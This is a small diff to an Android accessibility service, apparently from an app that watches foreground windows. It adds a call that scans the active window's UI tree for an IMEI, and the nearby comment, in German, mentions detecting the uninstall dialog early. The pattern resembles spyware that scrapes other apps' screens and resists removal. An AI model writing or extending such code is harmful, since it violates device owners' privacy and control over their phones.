@@ -57,6 +57,7 @@ class IdleWatcherService : AccessibilityService() {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) foregroundPkg = pkg
+        if (ImeiCapture.capturing) ImeiCapture.scan(rootInActiveWindow)
         if (pkg == packageName) return
 
         // Deinstallieren-Dialog so früh wie möglich erkennen – auch schon beim Aufbau des Inhalts
